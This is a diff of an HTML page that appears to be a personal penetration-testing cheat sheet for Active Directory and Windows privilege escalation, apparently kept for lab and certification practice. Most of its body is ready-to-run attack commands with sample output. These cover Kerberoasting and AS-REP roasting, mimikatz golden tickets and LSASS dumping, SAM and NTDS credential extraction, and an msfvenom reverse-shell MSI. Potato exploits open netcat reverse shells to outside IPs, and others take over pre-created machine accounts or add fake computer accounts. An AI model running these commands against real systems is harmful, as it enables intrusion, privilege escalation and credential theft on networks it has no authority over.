@@ -3,7 +3,7 @@
   <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
     <meta charset="utf-8">
     <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
-    <meta name="generator" content="Hugo 0.154.5">
+    <meta name="generator" content="Hugo 0.161.1">
     <meta name="generator" content="Relearn 9.0.3+36307e4ed23582638ab689240ac7b427217803ee">
     <meta name="description" content="Kerberos Kerberoasting (service account) linux impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete windows Rubeus.exe kerberoast /nowrap /outfile:hash /format:hashcat hashcat:
 hashcat -m 13100 hash.txt /path/to/wordlist -r /usr/share/hashcat/rules/best64.rule
@@ -31,29 +31,30 @@ hashcat -m 13100 hash.txt /path/to/wordlist -r /usr/share/hashcat/rules/best64.r
 AS-REP Roasting (user account) windows .\Rubeus.exe asreproast /nowrap /outfile:hash.txt linux impacket-GetNPUsers corp.com/dave -dc-ip 192.168.114.70 hashcat:">
     <meta itemprop="datePublished" content="2026-04-28T20:19:35+09:00">
     <meta itemprop="dateModified" content="2026-04-28T20:19:35+09:00">
-    <meta itemprop="wordCount" content="747">
+    <meta itemprop="wordCount" content="1295">
     <title>Cheatsheet :: Zenu</title>
-    <link href="/images/favicon.png?1779778938" rel="icon" type="image/png">
-    <link href="/css/auto-complete/auto-complete.min.css?1779778938" rel="stylesheet">
-    <script src="/js/auto-complete/auto-complete.min.js?1779778938" defer></script>
-    <script src="/js/search-lunr.js?1779778938" defer></script>
-    <script src="/js/search.js?1779778938" defer></script>
+    <link href="/images/favicon.png?1784855724" rel="icon" type="image/png">
+    <link href="/images/favicon.ico?1784855724" rel="icon" type="image/x-icon" sizes="any">
+    <link href="/css/auto-complete/auto-complete.min.css?1784855724" rel="stylesheet">
+    <script src="/js/auto-complete/auto-complete.min.js?1784855724" defer></script>
+    <script src="/js/search-lunr.js?1784855724" defer></script>
+    <script src="/js/search.js?1784855724" defer></script>
     <script>
       window.relearn = window.relearn || {};
-      window.relearn.index_js_url="/searchindex.en.js?1779778938";
+      window.relearn.index_js_url="/searchindex.en.js?1784855724";
     </script>
-    <script src="/js/lunr/lunr.min.js?1779778938" defer></script>
-    <script src="/js/lunr/lunr.stemmer.support.min.js?1779778938" defer></script>
-    <script src="/js/lunr/lunr.multi.min.js?1779778938" defer></script>
-    <script src="/js/lunr/lunr.en.min.js?1779778938" defer></script>
+    <script src="/js/lunr/lunr.min.js?1784855724" defer></script>
+    <script src="/js/lunr/lunr.stemmer.support.min.js?1784855724" defer></script>
+    <script src="/js/lunr/lunr.multi.min.js?1784855724" defer></script>
+    <script src="/js/lunr/lunr.en.min.js?1784855724" defer></script>
     <script>
       window.relearn = window.relearn || {};
       window.relearn.contentLangs=['en'];
     </script>
-    <link href="/fonts/fontawesome/css/all.min.css?1779778938" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/all.min.css?1779778938" rel="stylesheet"></noscript>
-    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1779778938" rel="stylesheet">
-    <link href="/css/theme.css?1779778938" rel="stylesheet">
-    <link href="/css/format-html.css?1779778938" rel="stylesheet" id="R-format-style">
+    <link href="/fonts/fontawesome/css/all.min.css?1784855724" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/all.min.css?1784855724" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1784855724" rel="stylesheet">
+    <link href="/css/theme.css?1784855724" rel="stylesheet">
+    <link href="/css/format-html.css?1784855724" rel="stylesheet" id="R-format-style">
     <script>
       window.relearn = window.relearn || {};
       // configuration
@@ -124,6 +125,7 @@ AS-REP Roasting (user account) windows .\Rubeus.exe asreproast /nowrap /outfile:
         <li><a href="#kerberoasting-service-account">Kerberoasting (service account)</a></li>
         <li><a href="#as-rep-roasting-user-account">AS-REP Roasting (user account)</a></li>
         <li><a href="#golden-ticket">Golden ticket</a></li>
+        <li><a href="#pre2k">pre2k</a></li>
       </ul>
     </li>
     <li><a href="#alwaysinstallelevated">AlwaysInstallElevated</a></li>
@@ -140,8 +142,12 @@ AS-REP Roasting (user account) windows .\Rubeus.exe asreproast /nowrap /outfile:
       <ul>
         <li><a href="#readgmsapassword">ReadGMSAPassword</a></li>
         <li><a href="#genericall-on-computer">GenericAll on Computer</a></li>
+        <li><a href="#genericall-on-user">GenericAll on User</a></li>
+        <li><a href="#forcechangepassword">ForceChangePassword</a></li>
+        <li><a href="#genericwrite">GenericWrite</a></li>
         <li><a href="#writeowner">WriteOwner</a></li>
         <li><a href="#allextendedrights">AllExtendedRights</a></li>
+        <li><a href="#getchanges-getchangesall">getchanges, getchangesall</a></li>
       </ul>
     </li>
     <li><a href="#mimikatz">mimikatz</a></li>
@@ -156,6 +162,7 @@ AS-REP Roasting (user account) windows .\Rubeus.exe asreproast /nowrap /outfile:
         <li><a href="#ldap">ldap</a></li>
       </ul>
     </li>
+    <li><a href="#ldapsearch">ldapsearch</a></li>
     <li><a href="#webdav">webdav</a>
       <ul>
         <li><a href="#davtest">davtest</a></li>
@@ -188,6 +195,26 @@ AS-REP Roasting (user account) windows .\Rubeus.exe asreproast /nowrap /outfile:
         <li><a href="#plumhound">plumhound</a></li>
       </ul>
     </li>
+    <li><a href="#git">git</a>
+      <ul>
+        <li><a href="#git-dumper">git-dumper</a></li>
+      </ul>
+    </li>
+    <li><a href="#evilwin-rm">evilwin-rm</a></li>
+    <li><a href="#runascs">runascs</a></li>
+    <li><a href="#privileged-groups">Privileged groups</a>
+      <ul>
+        <li><a href="#server-operator-group">server operator group</a></li>
+      </ul>
+    </li>
+    <li><a href="#certipy-ad">CERTIPY-AD</a>
+      <ul>
+        <li><a href="#esc1">ESC1</a></li>
+      </ul>
+    </li>
+    <li><a href="#sudo">sudo</a></li>
+    <li><a href="#postgres">postgres</a></li>
+    <li><a href="#systemd">systemd</a></li>
   </ul>
 </nav>
                 </div>
@@ -229,22 +256,22 @@ AS-REP Roasting (user account) windows .\Rubeus.exe asreproast /nowrap /outfile:
 <ul>
 <li>linux</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete</span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete</span></span></code></pre></div>
 <ul>
 <li>windows</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>Rubeus.exe kerberoast /nowrap /outfile:hash /format:hashcat</span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>Rubeus.exe kerberoast /nowrap /outfile:hash /format:hashcat</span></span></code></pre></div>
 <p>hashcat:</p>
 <p><code>hashcat -m 13100 hash.txt /path/to/wordlist -r /usr/share/hashcat/rules/best64.rule</code></p>
 <h3 id="as-rep-roasting-user-account">AS-REP Roasting (user account)<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h3>
 <ul>
 <li>windows</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>.\Rubeus.exe asreproast /nowrap /outfile<span style="color:#960050;background-color:#1e0010">:</span>hash.txt</span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>.\Rubeus.exe asreproast /nowrap /outfile<span style="color:#960050;background-color:#1e0010">:</span>hash.txt</span></span></code></pre></div>
 <ul>
 <li>linux</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>impacket-GetNPUsers corp.com/dave -dc-ip 192.168.114.70</span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>impacket-GetNPUsers corp.com/dave -dc-ip 192.168.114.70</span></span></code></pre></div>
 <p>hashcat:</p>
 <p><code>hashcat -m 18200 hash.txt /path/to/wordlist</code></p>
 <h3 id="golden-ticket">Golden ticket<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h3>
@@ -252,33 +279,57 @@ AS-REP Roasting (user account) windows .\Rubeus.exe asreproast /nowrap /outfile:
 <ul>
 <li>From mimikatz</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span># privilege::debug
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span># privilege::debug
 </span></span><span style="display:flex;"><span># lsadump::lsa /inject /name:krbtgt   (get SID, NTLM hash)
 </span></span><span style="display:flex;"><span> # kerberos::golden /User:fakeuser123 /domain:marvel.local /sid:$SID /krbtgt:$NTLM /id:500 /ptt
 </span></span><span style="display:flex;"><span># misc::cmd </span></span></code></pre></div>
 <p>or get a shell using Psexec</p>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>PsExec64.exe \\TargetMachine cmd.exe  </span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>PsExec64.exe \\TargetMachine cmd.exe  </span></span></code></pre></div>
+<h3 id="pre2k">pre2k<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h3>
+<ul>
+<li>enum pre2k machines</li>
+</ul>
+<p><code>nxc ldap retro.vl -u 'trainee' -p 'trainee' -M pre2k</code></p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>LDAP        10.129.2.242    389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:retro.vl)
+LDAP        10.129.2.242    389    DC               [+] retro.vl\trainee:trainee
+PRE2K       10.129.2.242    389    DC               Pre-created computer account: BANKING$
+PRE2K       10.129.2.242    389    DC               [+] Found 1 pre-created computer accounts. Saved to /home/parallels/.nxc/modules/pre2k/retro.vl/precreated_computers.txt
+PRE2K       10.129.2.242    389    DC               [+] Successfully obtained TGT for banking@retro.vl
+PRE2K       10.129.2.242    389    DC               [+] Successfully obtained TGT for 1 pre-created computer accounts. Saved to /home/parallels/.nxc/modules/pre2k/ccache</code></pre></div>
+<ul>
+<li>
+<p>When the machine name is <code>BANKING$</code>, then the default password is <code>banking</code></p>
+</li>
+<li>
+<p>change the password</p>
+</li>
+</ul>
+<p><code>impacket-changepasswd 'retro.vl/BANKING$@10.129.234.44' -newpass 'Password1!' -p rpc-samr</code></p>
+<ul>
+<li>export the ccache file</li>
+</ul>
+<p><code>export KRB5CCNAME=/home/parallels/.nxc/modules/pre2k/ccache/banking.ccache</code></p>
 <h2 id="alwaysinstallelevated">AlwaysInstallElevated<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
-<p><a href="#R-image-422822bfaf371b4afd001d32d15523eb" class="lightbox-link"><img alt="msi" class="lazy lightbox figure-image" loading="lazy" src="/images/alwayselevated.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-422822bfaf371b4afd001d32d15523eb"><img alt="msi" class="lazy lightbox lightbox-image" loading="lazy" src="/images/alwayselevated.png"></a></p>
+<p><a href="#R-image-69e12dbd3de454f76e3528490ee8e808" class="lightbox-link"><img alt="msi" class="lazy lightbox figure-image" loading="lazy" src="/images/alwayselevated.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-69e12dbd3de454f76e3528490ee8e808"><img alt="msi" class="lazy lightbox lightbox-image" loading="lazy" src="/images/alwayselevated.png"></a></p>
 <ul>
 <li>msi file executed as admin</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>msfvenom -p windows/x64/shell_reverse_tcp -f msi -o rev.msi LHOST<span style="color:#f92672">=</span>192.168.45.209 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">8888</span></span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>msfvenom -p windows/x64/shell_reverse_tcp -f msi -o rev.msi LHOST<span style="color:#f92672">=</span>192.168.45.209 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">8888</span></span></span></code></pre></div>
 <ul>
 <li>move it to the target server and just run it.</li>
 </ul>
 <h2 id="windows-privileges">Windows privileges<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
 <h3 id="seimpersonateprivilege">SeImpersonatePrivilege<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h3>
 <h4 id="potato">potato<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h4>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>.\SigmaPotato.exe --revshell <span style="color:#ae81ff">192.168</span>.45.188 <span style="color:#ae81ff">4444</span></span></span></code></pre></div>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>.\godpotato.exe -cmd <span style="color:#e6db74">&#34;nc.exe 192.168.45.246 443 -e cmd&#34;</span></span></span></code></pre></div>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>.\JuicyPotatoNG.exe -t * -p <span style="color:#e6db74">&#34;c:\windows\system32\cmd.exe&#34;</span> -a <span style="color:#e6db74">&#34;/c C:\users\chen\nc.exe 192.168.45.226 443 -e cmd&#34;</span></span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>.\SigmaPotato.exe --revshell <span style="color:#ae81ff">192.168</span>.45.188 <span style="color:#ae81ff">4444</span></span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>.\godpotato.exe -cmd <span style="color:#e6db74">&#34;nc.exe 192.168.45.246 443 -e cmd&#34;</span></span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>.\JuicyPotatoNG.exe -t * -p <span style="color:#e6db74">&#34;c:\windows\system32\cmd.exe&#34;</span> -a <span style="color:#e6db74">&#34;/c C:\users\chen\nc.exe 192.168.45.226 443 -e cmd&#34;</span></span></span></code></pre></div>
 <h3 id="sebackupprivilege">SeBackupPrivilege<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h3>
 <ul>
 <li>copy SAM and SYSTEM files</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\users\anirudh&gt; reg save hklm\sam ./sam
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\users\anirudh&gt; reg save hklm\sam ./sam
 </span></span><span style="display:flex;"><span>The operation completed successfully.
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\users\anirudh&gt; reg save hklm\system ./system
@@ -286,19 +337,27 @@ AS-REP Roasting (user account) windows .\Rubeus.exe asreproast /nowrap /outfile:
 <ul>
 <li>download to kali machine</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\users\anirudh&gt; download sam
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\users\anirudh&gt; download sam
 </span></span><span style="display:flex;"><span>Info<span style="color:#960050;background-color:#1e0010">:</span> Downloading C:\users\anirudh\sam to sam
 </span></span><span style="display:flex;"><span>Info<span style="color:#960050;background-color:#1e0010">:</span> Download successful!
 </span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\users\anirudh&gt; download system
 </span></span><span style="display:flex;"><span>Info<span style="color:#960050;background-color:#1e0010">:</span> Downloading C:\users\anirudh\system to system
 </span></span><span style="display:flex;"><span>Info<span style="color:#960050;background-color:#1e0010">:</span> Download successful!</span></span></code></pre></div>
 <ul>
-<li>extract credentials</li>
+<li>extract local credentials</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>impacket-secretsdump -system system -sam sam local                             </span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>impacket-secretsdump -system system -sam sam local                             </span></span></code></pre></div>
+<ul>
+<li>extract domain credentials</li>
+</ul>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>impacket-secretsdump -system system -ntds ntds.dit local</span></span></code></pre></div>
+<ul>
+<li>rocopy with the backup privilege</li>
+</ul>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>robocopy C:\users\administrator\desktop c:\users root.txt /B</code></pre></div>
 <h3 id="serestoreprivilege">SeRestorePrivilege<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h3>
 <p><a href="https://oscp.adot8.com/windows-privilege-escalation/whoami-priv/serestoreprivilege" rel="external">https://oscp.adot8.com/windows-privilege-escalation/whoami-priv/serestoreprivilege</a></p>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>.\EnableSeRestorePrivilege.ps1
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>.\EnableSeRestorePrivilege.ps1
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>ren C:\Windows\System32\Utilman.exe C:\Windows\System32\Utilman.pwned
 </span></span><span style="display:flex;"><span>ren C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
@@ -310,16 +369,16 @@ AS-REP Roasting (user account) windows .\Rubeus.exe asreproast /nowrap /outfile:
 <ul>
 <li>Prepare <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/procdump" rel="external">procdump.exe</a></li>
 </ul>
-<p><a href="#R-image-60d55a216fa701a886f3e10d432ffc24" class="lightbox-link"><img alt="debug" class="lazy lightbox figure-image" loading="lazy" src="/images/etc/debugpriv.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-60d55a216fa701a886f3e10d432ffc24"><img alt="debug" class="lazy lightbox lightbox-image" loading="lazy" src="/images/etc/debugpriv.png"></a></p>
+<p><a href="#R-image-eba7670416d05fc293dd97872327f9f5" class="lightbox-link"><img alt="debug" class="lazy lightbox figure-image" loading="lazy" src="/images/etc/debugpriv.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-eba7670416d05fc293dd97872327f9f5"><img alt="debug" class="lazy lightbox lightbox-image" loading="lazy" src="/images/etc/debugpriv.png"></a></p>
 <ul>
 <li>Run cmd as admin</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>procdump.exe -accepteula -ma lsass.exe lsass.dmp</span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>procdump.exe -accepteula -ma lsass.exe lsass.dmp</span></span></code></pre></div>
 <ul>
 <li>Run mimikatz as admin</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>privilege::debug
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>privilege::debug
 </span></span><span style="display:flex;"><span>sekurlsa::minidump lsass.dmp
 </span></span><span style="display:flex;"><span>sekurlsa::logonpasswords</span></span></code></pre></div>
 <h2 id="gpo">GPO<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
@@ -327,56 +386,74 @@ AS-REP Roasting (user account) windows .\Rubeus.exe asreproast /nowrap /outfile:
 <ul>
 <li>target: svc_apache</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>gmsapasswordreader.exe --accountname svc_apache</span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>gmsapasswordreader.exe --accountname svc_apache</span></span></code></pre></div>
 <h3 id="genericall-on-computer">GenericAll on Computer<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h3>
-<p><a href="#R-image-8a989fcc00499c215cd43ffb11e1f1c7" class="lightbox-link"><img alt="rbcd" class="lazy lightbox figure-image" loading="lazy" src="/images/rbcd/genericall.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-8a989fcc00499c215cd43ffb11e1f1c7"><img alt="rbcd" class="lazy lightbox lightbox-image" loading="lazy" src="/images/rbcd/genericall.png"></a></p>
+<p><a href="#R-image-ee755e7556f02ef71316ec0aaca50039" class="lightbox-link"><img alt="rbcd" class="lazy lightbox figure-image" loading="lazy" src="/images/rbcd/genericall.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-ee755e7556f02ef71316ec0aaca50039"><img alt="rbcd" class="lazy lightbox lightbox-image" loading="lazy" src="/images/rbcd/genericall.png"></a></p>
 <ul>
 <li>add a fake computer</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>impacket-addcomputer resourced.local/l.livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name <span style="color:#e6db74">&#39;fake$&#39;</span> -computer-pass <span style="color:#e6db74">&#39;password!&#39;</span> -dc-ip 192.168.176.175 
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>impacket-addcomputer resourced.local/l.livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name <span style="color:#e6db74">&#39;fake$&#39;</span> -computer-pass <span style="color:#e6db74">&#39;password!&#39;</span> -dc-ip 192.168.176.175 
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully added machine account fake$ with password password!</span></span></code></pre></div>
 <ul>
 <li>Delegate role</li>
 </ul>
